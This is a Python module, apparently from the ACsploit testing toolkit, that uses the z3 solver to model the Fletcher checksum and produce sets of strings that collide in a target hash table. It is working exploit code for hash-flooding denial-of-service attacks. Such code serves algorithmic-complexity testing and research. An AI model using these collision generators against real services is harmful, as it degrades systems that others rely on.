import z3
from acsploit.options import Options
from .z3_common import get_collisions


options = Options()
options.add_option('n_collisions', 10, 'Number of colliding strings to create')
options.add_option('length', 10, 'Length of strings to create')
options.add_option('hash_table_size', 100, 'Size of target hash table')
options.add_option('width', 16, 'Bit-width of Fletcher checksum', [16, 32, 64])
options.add_option('target_type', 'preimage', 'Whether the target is an image (hash output) or preimage (hash input)',
                   ['image', 'preimage'])
options.add_option('target', 'hello', 'Image or preimage of desired hash value')

DESCRIPTION = 'Produces hash collisions for the fletcher checksum function.' \
              '\n\n  ' \
              'This exploit works by using z3 to "solve" for hash collisions. An implementation of the Fletcher ' \
              'checksum for z3 is used to generate a constraint system that z3 solves to find colliding hash inputs.'

NO_INPUT = True


def run(output):
    ret = get_collisions(z3fletcher, options['target'], options['target_type'], options['length'], options['n_collisions'],
                         options['hash_table_size'], (2**(options['width']/2))-1)  # eg, fletcher16 => 255
    output.output(ret)


def z3fletcher(bytes, hash_table_size, modulus):  # computes the z3form of the fletcher checksum
    v1 = 0
    v2 = 0
    for byte in bytes:
        v1 = (v1 + z3.ZeroExt(56, byte)) % modulus
        v2 = (v2 + v1) % modulus
    return (v2 * (modulus+1) + v1) % hash_table_size
